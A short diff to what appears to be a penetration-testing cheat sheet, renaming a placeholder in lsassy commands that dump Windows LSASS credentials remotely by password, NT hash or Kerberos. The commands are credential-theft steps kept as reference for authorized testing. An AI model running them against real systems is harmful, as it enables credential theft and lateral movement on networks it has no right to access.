@@ -3,7 +3,7 @@
 ## Lsassy basic usage with password (ip or range)
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-lsassy -d <domain> -u <user> -p <password> <ip>
+lsassy -d <domain_fqdn> -u <user> -p <password> <ip>
 ```
 
 ## Lsassy basic usage with hash (ip or range)
@@ -15,5 +15,5 @@ lsassy -v -u <user> -H <nt_hash> <ip>
 ## Lsassy basic usage with kerberos (ip or range)
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-lsassy -d <domain> -u <user> -k <ip_range>
+lsassy -d <domain_fqdn> -u <user> -k <ip_range>
 ```
